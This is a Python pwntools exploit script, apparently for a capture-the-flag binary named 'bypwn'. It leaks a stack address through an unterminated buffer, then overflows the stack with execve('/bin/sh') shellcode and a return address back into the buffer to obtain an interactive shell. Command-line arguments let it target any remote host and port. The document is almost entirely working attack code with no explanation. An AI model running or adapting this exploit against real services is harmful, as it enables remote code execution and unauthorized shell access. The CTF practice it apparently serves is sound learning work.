from pwn import *
import sys
from LibcSearcher import *
context.log_level='debug'
context.arch='amd64'

def ret2libc(leak,func,path=''):
    if path == '':
        libc = LibcSearcher(func,leak)
        base = leak - libc.dump(func)
        system = base + libc.dump('system')
        binsh = base + libc.dump('str_bin_sh')
    else:
        libc = path
        libc.address = leak - libc.sym[func]
        system = libc.sym['system']
        binsh = next(libc.search(b'/bin/sh'))
    return (system,binsh)

s = lambda data : io.send(data)
sa = lambda str1,data : io.sendafter(str1,data)
sl = lambda data : io.sendline(data)
sla = lambda str1,data : io.sendlineafter(str1,data)
r = lambda num : io.recv(num)
rl = lambda keepends=True : io.recvline(keepends)
ru = lambda data,drop=True : io.recvuntil(data,drop)
ia = lambda : io.interactive()
uu32 = lambda data : u32(data.ljust(4,b'\x00'))
uu64 = lambda data : u64(data.ljust(8,b'\x00'))
i16 = lambda data : int(data,16)
leak = lambda name,addr : log.success('{} = {:#x}'.format(name, addr))
dbg = lambda : gdb.attach(io)

if len(sys.argv) == 3:
    io = remote(sys.argv[1], sys.argv[2])
elif len(sys.argv) == 2:
    if ':' in sys.argv[1]:
        rmt = sys.argv[1].split(':')
        io = remote(rmt[0], rmt[1])
    else:
        io = process(sys.argv[1])
        elf = ELF(sys.argv[1])
else:
    io = process('./bypwn')

elf = ELF("./bypwn")

sa(":",b"b"*(0x20-1)+b"a")
ru("a")
stack = uu64(r(6))
leak("stack",stack)
# dbg()
shellcode1 =p64(0) + b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05".ljust(0x50,b"b")
shellcode = shellcode1
shellcode += p64(stack-0x50) + p64(0x0000000000400861)

sla("PWN~",shellcode)
# sla("~",flat({0:shellcode1, 0x58: stack - 0x50}))

ia()
